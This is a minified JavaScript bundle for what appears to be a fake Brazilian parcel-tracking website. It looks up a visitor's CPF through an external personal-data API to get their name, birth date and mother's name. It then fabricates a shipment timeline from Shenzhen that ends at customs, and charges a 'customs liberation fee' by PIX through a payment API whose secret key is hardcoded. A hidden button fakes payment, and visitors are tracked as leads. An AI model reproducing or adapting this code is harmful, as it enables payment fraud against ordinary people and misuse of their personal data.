import"./style-D_BqrV0P.js";import{C as p}from"./cpf-validator-B4PsRAE6.js";import{N as P}from"./navigation-BwbyOJod.js";const E="modulepreload",b=function(u){return"/"+u},f={},y=function(e,t,o){let a=Promise.resolve();if(t&&t.length>0){document.getElementsByTagName("link");const n=document.querySelector("meta[property=csp-nonce]"),r=(n==null?void 0:n.nonce)||(n==null?void 0:n.getAttribute("nonce"));a=Promise.allSettled(t.map(s=>{if(s=b(s),s in f)return;f[s]=!0;const m=s.endsWith(".css"),g=m?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${s}"]${g}`))return;const d=document.createElement("link");if(d.rel=m?"stylesheet":E,m||(d.as="script"),d.crossOrigin="",d.href=s,r&&d.setAttribute("nonce",r),document.head.appendChild(d),m)return new Promise((c,h)=>{d.addEventListener("load",c),d.addEventListener("error",()=>h(new Error(`Unable to preload CSS for ${s}`)))})}))}function i(n){const r=new Event("vite:preloadError",{cancelable:!0});if(r.payload=n,window.dispatchEvent(r),!r.defaultPrevented)throw n}return a.then(n=>{for(const r of n||[])r.status==="rejected"&&i(r.reason);return e().catch(i)})};class S{constructor(){this.fallbackData=this.generateFallbackData(),console.log("DataService initialized")}async fetchCPFData(e){const t=e.replace(/[^\d]/g,"");console.log("Fetching data for CPF:",t);try{const o=await this.tryOfficialAPI(t);if(o)return console.log("Data obtained from official API:",o),o}catch(o){console.error("Official API failed, using fallback:",o.message)}return console.log("Using fallback data for CPF:",t),this.getFallbackData(t)}async tryOfficialAPI(e){const t=new AbortController,o=setTimeout(()=>t.abort(),15e3);try{console.log("Calling official API endpoint for CPF:",e);const a=`https://api.amnesiatecnologia.rocks/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${e}`,i={signal:t.signal,method:"GET",mode:"cors",headers:{Accept:"application/json","Content-Type":"application/json","User-Agent":"Mozilla/5.0 (compatible; TrackingSystem/1.0)"},credentials:"omit"};console.log("Fetch options:",i),console.log("API URL:",a);const n=await fetch(a,i);if(clearTimeout(o),console.log("Response status:",n.status),console.log("Response headers:",Object.fromEntries(n.headers.entries())),!n.ok)throw console.error(`HTTP Error: ${n.status} - ${n.statusText}`),new Error(`API Error: ${n.status} - ${n.statusText}`);const r=await n.text();if(console.log("API Response Text:",r.substring(0,200)+(r.length>200?"...":"")),!r||r.trim()==="")throw console.error("Empty response from API"),new Error("Resposta vazia da API");try{const s=JSON.parse(r);if(console.log("Parsed API data:",s),s&&s.DADOS&&s.DADOS.nome&&s.DADOS.cpf)return console.log("✅ Dados válidos recebidos da API oficial"),console.log("Nome encontrado:",s.DADOS.nome),console.log("CPF:",s.DADOS.cpf),{DADOS:{nome:s.DADOS.nome,cpf:s.DADOS.cpf,nascimento:this.formatBirthDate(s.DADOS.data_nascimento),situacao:"REGULAR",sexo:s.DADOS.sexo||"N/A",nome_mae:s.DADOS.nome_mae||"N/A"}};throw console.error("Invalid data format from API:",s),new Error("Formato de dados inválido da API")}catch(s){throw console.error("JSON parse error:",s),new Error("Erro ao processar resposta da API: "+s.message)}}catch(a){throw clearTimeout(o),console.error("API call error details:",{name:a.name,message:a.message,stack:a.stack,cause:a.cause}),a.name==="AbortError"?(console.error("Request was aborted (timeout)"),new Error("Timeout: A API demorou muito para responder")):a.message.includes("Failed to fetch")?(console.error("Network error - possibly CORS or connectivity issue"),new Error("Erro de conectividade: Não foi possível acessar a API externa")):a.message.includes("CORS")?(console.error("CORS error detected"),new Error("Erro de CORS: API externa não permite acesso do navegador")):a}}formatBirthDate(e){if(!e)return null;try{return e}catch(t){return console.error("Erro ao formatar data de nascimento:",t),null}}getFallbackData(e){const t=["João Silva Santos","Maria Oliveira Costa","Pedro Souza Lima","Ana Paula Ferreira","Carlos Eduardo Alves","Fernanda Santos Rocha","Ricardo Pereira Dias","Juliana Costa Martins","Bruno Almeida Silva","Camila Rodrigues Nunes","Rafael Santos Barbosa","Larissa Oliveira Cruz"],o=parseInt(e.slice(-2))%t.length,a=t[o];return console.log("Generated fallback data for CPF:",e,"Name:",a),{DADOS:{nome:a,cpf:e,nascimento:this.generateBirthDate(e),situacao:"REGULAR"}}}generateBirthDate(e){const t=1960+parseInt(e.slice(0,2))%40,o=parseInt(e.slice(2,4))%12+1;return`${(parseInt(e.slice(4,6))%28+1).toString().padStart(2,"0")}/${o.toString().padStart(2,"0")}/${t}`}generateFallbackData(){return{products:["Kit 12 caixas organizadoras + brinde","Conjunto de panelas antiaderentes","Smartphone Samsung Galaxy A54","Fone de ouvido Bluetooth","Carregador portátil 10000mAh","Camiseta básica algodão","Tênis esportivo Nike","Relógio digital smartwatch"]}}}class v{static generateTrackingData(e){const t=new Date,o={cpf:e.cpf,currentStep:"customs",steps:[],liberationPaid:!1,liberationDate:null,deliveryAttempts:0,lastUpdate:t.toISOString()},a=this.generateRealisticDates(t,11),i=this.getTrackingSteps();for(let n=0;n<10;n++)o.steps.push({id:n+1,date:a[n],title:i[n].title,description:i[n].description,isChina:i[n].isChina||!1,completed:!0});return o.steps.push({id:11,date:a[10],title:i[10].title,description:i[10].description,completed:!0,needsLiberation:!0}),o}static generateRealisticDates(e,t){const o=[],a=new Date,i=new Date(e),n=new Date(i);n.setDate(n.getDate()-2),o.push(this.getRandomTimeOnDate(n)),o.push(this.getRandomTimeOnDate(n));const r=new Date(i);r.setDate(r.getDate()-1);for(let s=2;s<9;s++)o.push(this.getRandomTimeOnDate(r));return o.push(this.getTimeBeforeNow(i,a,1)),o.push(this.getTimeBeforeNow(i,a,2)),o}static getRandomTimeOnDate(e){const t=new Date(e),o=Math.floor(Math.random()*18)+5,a=Math.floor(Math.random()*60);return t.setHours(o,a,0,0),t}static getTimeBeforeNow(e,t,o){const a=new Date(e);t.getHours(),t.getMinutes();let i;o===1?i=Math.floor(Math.random()*4)+2:i=Math.random()*1.5+.5;const n=new Date(t);return n.setHours(n.getHours()-i),n.getHours()<6&&(n.setHours(6+Math.floor(Math.random()*2)),n.setMinutes(Math.floor(Math.random()*60))),a.setHours(n.getHours(),n.getMinutes(),0,0),a}static getTrackingSteps(){return[{title:"Seu pedido foi criado",description:"Seu pedido foi criado"},{title:"Preparando para envio",description:"O seu pedido está sendo preparado para envio"},{title:"Pedido enviado",description:"[China] O vendedor enviou seu pedido",isChina:!0},{title:"Centro de triagem",description:"[China] O pedido chegou ao centro de triagem de Shenzhen",isChina:!0},{title:"Centro logístico",description:"[China] Pedido saiu do centro logístico de Shenzhen",isChina:!0},{title:"Trânsito internacional",description:"[China] Coletado. O pedido está em trânsito internacional",isChina:!0},{title:"Liberado para exportação",description:"[China] O pedido foi liberado na alfândega de exportação",isChina:!0},{title:"Saiu da origem",description:"Pedido saiu da origem: Shenzhen"},{title:"Chegou no Brasil",description:"Pedido chegou no Brasil"},{title:"Centro de distribuição",description:"Pedido em trânsito para CURITIBA/PR"},{title:"Alfândega de importação",description:"Pedido chegou na alfândega de importação: CURITIBA/PR"}]}}class l{static showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");if(t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden",!document.getElementById("trackingAnimations")){const o=document.createElement("style");o.id="trackingAnimations",o.textContent=`
                @keyframes progressBar {
                    from { width: 0%; }
                    to { width: 100%; }
                }
                @keyframes fadeIn {
                    from { opacity: 0; }
                background: #1e4a6b;
                }
                @keyframes slideUp {
                    from { opacity: 0; transform: translateY(50px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
            `,document.head.appendChild(o)}}static closeLoadingNotification(){const e=document.getElementById("trackingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}static showError(e){const t=document.querySelector(".error-message");t&&t.remove();const o=document.createElement("div");o.className="error-message",o.style.cssText=`
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `,o.textContent=e;const a=document.querySelector(".tracking-form");a&&(a.appendChild(o),setTimeout(()=>{o.parentNode&&(o.style.animation="slideUp 0.3s ease",setTimeout(()=>o.remove(),300))},5e3))}static scrollToElement(e,t=0){if(!e)return;const a=e.getBoundingClientRect().top+window.pageYOffset-t;window.scrollTo({top:a,behavior:"smooth"})}static animateTimeline(){document.querySelectorAll(".timeline-item").forEach((t,o)=>{setTimeout(()=>{t.style.opacity="1",t.style.transform="translateY(0)"},o*100)})}}class C{constructor(){this.baseURL="https://zentrapay-api.onrender.com",this.apiSecret=this.getApiSecret(),console.log("🔑 ZentraPayService inicializado com API oficial"),console.log("🔐 API Secret configurada:",this.apiSecret?"SIM":"NÃO")}getApiSecret(){const e=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key")||"sk_771c0f95ada260e7c2762cf26e2910dcc2efd47ca33899c5dc1c9d82c89b9be27f143f954da017fa9ffe9030ac5f0823cd50b6b6dee7a56c1a301dadf1b6a8f8";return e.startsWith("sk_")?(console.log("✅ API Secret Zentra Pay válida encontrada"),console.log("🔑 Secret (primeiros 20 chars):",e.substring(0,20)+"...")):console.error("❌ API Secret Zentra Pay inválida ou não configurada"),e}generateUniqueEmail(e){const t=Math.random().toString(36).substring(2,8);return`lead${e}_${t}@tempmail.com`}generateUniquePhone(e){return`11${e.toString().slice(-8)}`}generateExternalId(){const e=Date.now(),t=Math.random().toString(36).substring(2,8);return`bolt_${e}_${t}`}async createPixTransaction(e,t){var o,a;try{const i=Date.now(),n=this.generateUniqueEmail(i),r=this.generateUniquePhone(i),s=this.generateExternalId();if(this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida ou não configurada. Verifique se a chave Zentra Pay está corretamente definida.");const m={external_id:s,total_amount:parseFloat(t),payment_method:"PIX",webhook_url:"https://meusite.com/webhook",items:[{id:"liberation_fee",title:"Taxa de Liberação Aduaneira",quantity:1,price:parseFloat(t),description:"Taxa única para liberação de objeto na alfândega",is_physical:!1}],ip:"8.8.8.8",customer:{name:e.nome,email:n,phone:r,document_type:"CPF",document:e.cpf.replace(/[^\d]/g,"")}};console.log("🚀 Criando transação Zentra Pay com API oficial:",{external_id:m.external_id,total_amount:`R$ ${m.total_amount.toFixed(2)}`,payment_method:m.payment_method,webhook_url:m.webhook_url,ip:m.ip,customer:{name:m.customer.name,document:m.customer.document,email:m.customer.email,phone:m.customer.phone,document_type:m.customer.document_type}});const g={"api-secret":this.apiSecret,"Content-Type":"application/json"};console.log("📡 Headers da requisição (oficial):",{"api-secret":`${this.apiSecret.substring(0,20)}...`,"Content-Type":g["Content-Type"]});const d=await fetch(`${this.baseURL}/v1/transactions`,{method:"POST",headers:g,body:JSON.stringify(m)});if(console.log("📡 Status da resposta:",d.status),console.log("📡 Headers da resposta:",Object.fromEntries(d.headers.entries())),!d.ok){const h=await d.text();throw console.error("❌ Erro na API Zentra Pay:",{status:d.status,statusText:d.statusText,body:h,headers:Object.fromEntries(d.headers.entries())}),new Error(`Erro na API: ${d.status} - ${h}`)}const c=await d.json();if(console.log("✅ Resposta Zentra Pay recebida:",{transaction_id:c.transaction_id||c.id,external_id:c.external_id,has_pix_payload:!!((o=c.pix)!=null&&o.payload),has_qr_code:!!((a=c.pix)!=null&&a.qr_code),status:c.status,payment_method:c.payment_method}),!c.pix||!c.pix.payload)throw console.error("❌ Resposta incompleta da API:",c),new Error("Resposta da API não contém os dados PIX necessários (pix.payload)");return console.log("🎉 PIX gerado com sucesso via API oficial!"),console.log("📋 PIX Payload (copia e cola):",c.pix.payload),{success:!0,externalId:s,pixPayload:c.pix.payload,qrCode:c.pix.qr_code||null,transactionId:c.transaction_id||c.id,email:n,telefone:r,valor:t,status:c.status||"pending",paymentMethod:c.payment_method||"PIX",timestamp:i}}catch(i){return console.error("💥 Erro ao criar transação PIX:",{message:i.message,stack:i.stack,apiSecret:this.apiSecret?"CONFIGURADA":"NÃO CONFIGURADA"}),{success:!1,error:i.message,details:i.stack}}}setApiSecret(e){return!e||!e.startsWith("sk_")?(console.error("❌ API Secret inválida fornecida"),!1):(this.apiSecret=e,localStorage.setItem("zentra_pay_secret_key",e),window.ZENTRA_PAY_SECRET_KEY=e,console.log("🔑 API Secret Zentra Pay atualizada com sucesso"),!0)}async testConnection(){try{if(console.log("🔍 Testando conexão com Zentra Pay..."),this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida para teste de conexão");const e=await fetch(`${this.baseURL}/health`,{method:"GET",headers:{"api-secret":this.apiSecret,"Content-Type":"application/json"}});return e.ok?(console.log("✅ Conexão com Zentra Pay OK"),!0):(console.warn("⚠️ Problema na conexão:",e.status),!1)}catch(e){return console.error("❌ Erro ao testar conexão:",e),!1}}validateApiSecret(){return this.apiSecret?this.apiSecret.startsWith("sk_")?this.apiSecret.length<50?(console.error("❌ API Secret muito curta"),!1):(console.log("✅ API Secret válida"),!0):(console.error("❌ Formato de API Secret inválido"),!1):(console.error("❌ Nenhuma API Secret configurada"),!1)}}class I{constructor(){this.currentCPF=null,this.trackingData=null,this.userData=null,this.dataService=new S,this.zentraPayService=new C,this.isInitialized=!1,this.pixData=null,this.paymentErrorShown=!1,this.paymentRetryCount=0,console.log("TrackingSystem inicializado com Zentra Pay oficial"),this.initWhenReady()}initWhenReady(){document.readyState==="loading"?document.addEventListener("DOMContentLoaded",()=>this.init()):this.init(),setTimeout(()=>this.init(),100),setTimeout(()=>this.init(),500),setTimeout(()=>this.init(),1e3)}init(){if(!this.isInitialized){console.log("Inicializando sistema de rastreamento...");try{this.setupEventListeners(),this.handleAutoFocus(),this.clearOldData(),this.validateZentraPaySetup(),this.isInitialized=!0,console.log("Sistema de rastreamento inicializado com sucesso")}catch(e){console.error("Erro na inicialização:",e),setTimeout(()=>{this.isInitialized=!1,this.init()},1e3)}}}validateZentraPaySetup(){this.zentraPayService.validateApiSecret()?console.log("✅ API Zentra Pay configurada corretamente"):console.error("❌ Problema na configuração da API Zentra Pay")}setupEventListeners(){console.log("Configurando event listeners..."),this.setupFormSubmission(),this.setupCPFInput(),this.setupTrackButton(),this.setupModalEvents(),this.setupCopyButtons(),this.setupAccordion(),this.setupKeyboardEvents(),console.log("Event listeners configurados")}setupFormSubmission(){const e=document.getElementById("trackingForm");e&&(console.log("Form encontrado por ID"),e.addEventListener("submit",o=>{o.preventDefault(),o.stopPropagation(),console.log("Form submetido via ID"),this.handleTrackingSubmit()})),document.querySelectorAll("form").forEach((o,a)=>{console.log(`Configurando form ${a}`),o.addEventListener("submit",i=>{i.preventDefault(),i.stopPropagation(),console.log(`Form ${a} submetido`),this.handleTrackingSubmit()})})}setupTrackButton(){console.log("Configurando botão de rastreamento...");const e=document.getElementById("trackButton");e&&(console.log("Botão encontrado por ID: trackButton"),this.configureTrackButton(e)),document.querySelectorAll(".track-button").forEach((a,i)=>{console.log(`Configurando botão por classe ${i}`),this.configureTrackButton(a)}),document.querySelectorAll('button[type="submit"], button').forEach((a,i)=>{a.textContent&&a.textContent.toLowerCase().includes("rastrear")&&(console.log(`Configurando botão por texto ${i}: ${a.textContent}`),this.configureTrackButton(a))}),document.addEventListener("click",a=>{const i=a.target;i&&i.tagName==="BUTTON"&&i.textContent&&i.textContent.toLowerCase().includes("rastrear")&&(a.preventDefault(),a.stopPropagation(),console.log("Botão rastrear clicado via delegação"),this.handleTrackingSubmit())})}configureTrackButton(e){const t=e.cloneNode(!0);e.parentNode.replaceChild(t,e),t.addEventListener("click",o=>{o.preventDefault(),o.stopPropagation(),console.log("Botão rastrear clicado:",t.id||t.className),this.handleTrackingSubmit()}),t.style.cursor="pointer",t.style.pointerEvents="auto",t.removeAttribute("disabled"),t.type!=="submit"&&(t.type="button"),console.log("Botão configurado:",t.id||t.className)}setupCPFInput(){const e=document.getElementById("cpfInput");if(!e){console.warn("Campo CPF não encontrado");return}console.log("Configurando campo CPF..."),e.addEventListener("input",t=>{p.applyCPFMask(t.target),this.validateCPFInput()}),e.addEventListener("keypress",t=>{this.preventNonNumeric(t)}),e.addEventListener("keydown",t=>{t.key==="Enter"&&(t.preventDefault(),this.handleTrackingSubmit())}),e.addEventListener("paste",t=>{t.preventDefault();const a=(t.clipboardData||window.clipboardData).getData("text").replace(/[^\d]/g,"");a.length<=11&&(e.value=a,p.applyCPFMask(e),this.validateCPFInput())}),e.addEventListener("focus",()=>{e.setAttribute("inputmode","numeric")}),console.log("Campo CPF configurado")}preventNonNumeric(e){[8,9,27,13,46,35,36,37,38,39,40].includes(e.keyCode)||e.keyCode===65&&e.ctrlKey||e.keyCode===67&&e.ctrlKey||e.keyCode===86&&e.ctrlKey||e.keyCode===88&&e.ctrlKey||(e.shiftKey||e.keyCode<48||e.keyCode>57)&&(e.keyCode<96||e.keyCode>105)&&e.preventDefault()}validateCPFInput(){const e=document.getElementById("cpfInput"),t=document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');if(!e)return;const o=p.cleanCPF(e.value);t.forEach(a=>{a.textContent&&a.textContent.toLowerCase().includes("rastrear")&&(o.length===11?(a.disabled=!1,a.style.opacity="1",a.style.cursor="pointer",e.style.borderColor="#27ae60"):(a.disabled=!0,a.style.opacity="0.7",a.style.cursor="not-allowed",e.style.borderColor=o.length>0?"#e74c3c":"#e9ecef"))})}async handleTrackingSubmit(){console.log("=== INICIANDO PROCESSO DE RASTREAMENTO ===");const e=document.getElementById("cpfInput");if(!e){console.error("Campo CPF não encontrado"),l.showError("Campo CPF não encontrado. Recarregue a página.");return}const t=e.value,o=p.cleanCPF(t);if(console.log("CPF digitado:",t),console.log("CPF limpo:",o),!p.isValidCPF(t)){console.log("CPF inválido"),l.showError("Por favor, digite um CPF válido com 11 dígitos.");return}console.log("CPF válido, iniciando busca..."),l.showLoadingNotification();const a=document.querySelectorAll('#trackButton, .track-button, button[type="submit"]'),i=[];a.forEach((n,r)=>{n.textContent&&n.textContent.toLowerCase().includes("rastrear")&&(i[r]=n.innerHTML,n.innerHTML='<i class="fas fa-spinner fa-spin"></i> Consultando...',n.disabled=!0)});try{await new Promise(r=>setTimeout(r,3e3)),console.log("Buscando dados do CPF...");const n=await this.dataService.fetchCPFData(o);n&&n.DADOS?(console.log("Dados do CPF encontrados:",n.DADOS),this.currentCPF=o,this.userData=n.DADOS,l.closeLoadingNotification(),console.log("✅ Nome do usuário obtido da API:",this.userData.nome),console.log("✅ CPF do usuário:",this.userData.cpf),setTimeout(()=>{console.log("Exibindo resultados..."),this.displayOrderDetails(),this.generateTrackingData(),this.displayTrackingResults(),this.saveTrackingData();const r=document.getElementById("orderDetails");r&&l.scrollToElement(r,100),setTimeout(()=>{this.highlightLiberationButton()},1500)},300)):(console.log("CPF não encontrado"),l.closeLoadingNotification(),l.showError("CPF não encontrado. Tente novamente."))}catch(n){console.error("Erro no processo:",n),l.closeLoadingNotification(),l.showError("Erro ao consultar CPF. Tente novamente.")}finally{a.forEach((n,r)=>{n.textContent&&i[r]&&(n.innerHTML=i[r],n.disabled=!1)}),this.validateCPFInput()}}displayOrderDetails(){if(!this.userData)return;const e=this.userData.nome||"Nome não encontrado",t=this.getFirstAndLastName(e),o=p.formatCPF(this.userData.cpf||"");console.log("📝 Exibindo dados - Nome completo:",e,"Nome curto:",t),this.updateElement("customerName",t),this.updateElement("fullName",this.userData.nome),this.updateElement("formattedCpf",o),this.updateElement("customerNameStatus",t),console.log("✅ Interface atualizada com nome:",t),this.showElement("orderDetails"),this.showElement("trackingResults")}generateTrackingData(){this.trackingData=v.generateTrackingData(this.userData)}displayTrackingResults(){this.updateStatus(),this.renderTimeline(),setTimeout(()=>{l.animateTimeline()},500)}updateStatus(){const e=document.getElementById("statusIcon"),t=document.getElementById("currentStatus");!e||!t||this.trackingData.currentStep==="customs"&&(e.innerHTML='<i class="fas fa-clock"></i>',e.className="status-icon in-transit",t.textContent="Aguardando liberação aduaneira")}renderTimeline(){const e=document.getElementById("trackingTimeline");e&&(e.innerHTML="",this.trackingData.steps.forEach((t,o)=>{const a=this.createTimelineItem(t,o===this.trackingData.steps.length-1);e.appendChild(a)}))}createTimelineItem(e,t){const o=document.createElement("div");o.className=`timeline-item ${e.completed?"completed":""} ${t?"last":""}`;const a=new Date(e.date),i=a.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),n=a.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let r="";if(e.needsLiberation&&!this.trackingData.liberationPaid&&(r=`
                <button class="liberation-button-timeline" data-step-id="${e.id}">
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `),o.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${i}</span>
                    <span class="time">${n}</span>
                </div>
                <div class="timeline-text">
                    <p>${e.isChina?'<span class="china-tag">[China]</span>':""}${e.description}</p>
                    ${r}
                </div>
            </div>
        `,e.needsLiberation&&!this.trackingData.liberationPaid){const s=o.querySelector(".liberation-button-timeline");s&&s.addEventListener("click",()=>{this.openLiberationModal()})}return o}highlightLiberationButton(){const e=document.querySelector(".liberation-button-timeline");e&&(l.scrollToElement(e,window.innerHeight/2),setTimeout(()=>{e.style.animation="pulse 2s infinite, glow 2s ease-in-out",e.style.boxShadow="0 0 20px rgba(255, 107, 53, 0.8)",setTimeout(()=>{e.style.animation="pulse 2s infinite",e.style.boxShadow="0 4px 15px rgba(255, 107, 53, 0.4)"},6e3)},500))}setupModalEvents(){const e=document.getElementById("closeModal");e&&e.addEventListener("click",()=>{this.closeModal("liberationModal")});const t=document.getElementById("closeDeliveryModal");t&&t.addEventListener("click",()=>{this.closeModal("deliveryModal")}),["liberationModal","deliveryModal"].forEach(o=>{const a=document.getElementById(o);a&&a.addEventListener("click",i=>{i.target.id===o&&this.closeModal(o)})})}setupCopyButtons(){[{buttonId:"copyPixButtonModal",inputId:"pixCodeModal"},{buttonId:"copyPixButtonDelivery",inputId:"pixCodeDelivery"}].forEach(({buttonId:t,inputId:o})=>{const a=document.getElementById(t);a&&a.addEventListener("click",()=>{this.copyPixCode(o,t)})})}setupAccordion(){const e=document.getElementById("detailsHeader");e&&e.addEventListener("click",()=>{this.toggleAccordion()})}setupKeyboardEvents(){document.addEventListener("keydown",e=>{e.key==="Escape"&&(this.closeModal("liberationModal"),this.closeModal("deliveryModal"),l.closeLoadingNotification())})}async openLiberationModal(){console.log("🚀 Iniciando processo de geração de PIX via Zentra Pay..."),l.showLoadingNotification();try{if(!this.zentraPayService.validateApiSecret())throw new Error("API Secret do Zentra Pay não configurada corretamente");const e=window.valor_em_reais||26.34;console.log("💰 Valor da transação:",`R$ ${e.toFixed(2)}`),console.log("👤 Dados do usuário:",{nome:this.userData.nome,cpf:this.userData.cpf}),console.log("📡 Enviando requisição para Zentra Pay...");const t=await this.zentraPayService.createPixTransaction(this.userData,e);if(t.success)console.log("🎉 PIX gerado com sucesso via API oficial Zentra Pay!"),console.log("📋 Dados recebidos:",{transactionId:t.transactionId,externalId:t.externalId,pixPayload:t.pixPayload,email:t.email,telefone:t.telefone,paymentMethod:t.paymentMethod,valor:t.valor}),this.pixData=t,l.closeLoadingNotification(),setTimeout(()=>{this.displayRealPixModal(),setTimeout(()=>{this.guideToCopyButton()},800)},300);else throw new Error(t.error||"Erro desconhecido ao gerar PIX")}catch(e){console.error("💥 Erro ao gerar PIX via Zentra Pay:",e),l.closeLoadingNotification(),l.showError(`Erro ao gerar PIX: ${e.message}`),setTimeout(()=>{console.log("⚠️ Exibindo modal estático como fallback"),this.displayStaticPixModal(),setTimeout(()=>{this.guideToCopyButton()},800)},1e3)}}showPaymentError(){this.paymentErrorShown=!0;const e=document.createElement("div");e.id="paymentErrorOverlay",e.className="modal-overlay",e.style.display="flex",e.innerHTML=`
            <div class="professional-modal-container" style="max-width: 450px;">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Erro de Pagamento</h2>
                    <button class="professional-modal-close" id="closePaymentErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content" style="text-align: center;">
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                    </div>
                    <p style="font-size: 1.1rem; margin-bottom: 25px; color: #333;">
                        Erro ao processar pagamento. Tente novamente.
                    </p>
                    <button id="retryPaymentButton" class="liberation-button-timeline" style="margin: 0 auto; display: block;">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>
            </div>
        `,document.body.appendChild(e),document.body.style.overflow="hidden";const t=document.getElementById("closePaymentErrorModal"),o=document.getElementById("retryPaymentButton");t&&t.addEventListener("click",()=>{this.closePaymentErrorModal()}),o&&o.addEventListener("click",()=>{this.closePaymentErrorModal(),this.openLiberationModal()}),e.addEventListener("click",a=>{a.target===e&&this.closePaymentErrorModal()})}closePaymentErrorModal(){const e=document.getElementById("paymentErrorOverlay");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}displayRealPixModal(){console.log("🎯 Exibindo modal com dados reais do PIX...");const e=document.getElementById("realPixQrCode");if(e&&this.pixData.pixPayload){const a=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;e.src=a,e.alt="QR Code PIX Real - Zentra Pay Oficial",console.log("✅ QR Code atualizado com dados reais da API oficial"),console.log("🔗 URL do QR Code:",a)}const t=document.getElementById("pixCodeModal");t&&this.pixData.pixPayload&&(t.value=this.pixData.pixPayload,console.log("✅ Código PIX Copia e Cola atualizado com dados reais da API oficial"),console.log("📋 PIX Payload Real:",this.pixData.pixPayload),console.log("📏 Tamanho do payload:",this.pixData.pixPayload.length,"caracteres"));const o=document.getElementById("liberationModal");o&&(o.style.display="flex",document.body.style.overflow="hidden",console.log("🎯 Modal PIX real exibido com sucesso"),setTimeout(()=>{this.addPaymentSimulationButton()},500)),console.log("🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!"),console.log("💳 Transação ID:",this.pixData.transactionId),console.log("🔢 External ID:",this.pixData.externalId),console.log("💰 Valor:",`R$ ${this.pixData.valor.toFixed(2)}`)}addPaymentSimulationButton(){const e=document.querySelector(".professional-modal-content");if(!e||document.getElementById("simulatePaymentButton"))return;const t=document.createElement("div");t.style.cssText=`
            margin-top: 20px;
            padding: 15px;
            background: transparent;
            border-radius: 8px;
            border: none;
            text-align: center;
        `,t.innerHTML=`
            <button id="simulatePaymentButton" style="
                background: transparent;
                color: #666;
                border: 1px solid #ddd;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.3s ease;
                opacity: 0.7;
                font-size: 12px;
                min-width: 30px;
                height: 28px;
            ">
                -
            </button>
        `,e.appendChild(t);const o=document.getElementById("simulatePaymentButton");o&&(o.addEventListener("click",()=>{this.simulatePayment()}),o.addEventListener("mouseenter",function(){this.style.background="rgba(0, 0, 0, 0.05)",this.style.transform="translateY(-1px)",this.style.opacity="1"}),o.addEventListener("mouseleave",function(){this.style.background="transparent",this.style.transform="translateY(0)",this.style.opacity="0.7"}))}simulatePayment(){this.closeModal("liberationModal"),this.paymentRetryCount++,this.paymentRetryCount===1?setTimeout(()=>{this.showPaymentError()},1e3):(this.paymentRetryCount=0,this.processSuccessfulPayment())}processSuccessfulPayment(){this.trackingData&&(this.trackingData.liberationPaid=!0),this.updatePaymentStatusInDatabase("pago");const e=document.querySelector(".liberation-button-timeline");e&&(e.style.display="none"),this.showSuccessNotification(),setTimeout(()=>{y(()=>import("./post-payment-system-EhJUruV_.js"),[]).then(t=>{const o=t.PostPaymentSystem;new o(this).startPostPaymentFlow()})},1e3)}async updatePaymentStatusInDatabase(e){if(this.currentCPF)try{const{DatabaseService:t}=await y(async()=>{const{DatabaseService:a}=await import("./database-C8z6-UQq.js");return{DatabaseService:a}},[]),o=new t;await o.updatePaymentStatus(this.currentCPF,e),await o.updateLeadStage(this.currentCPF,6),console.log("✅ Status de pagamento atualizado no banco:",e)}catch(t){console.error("❌ Erro ao atualizar status no 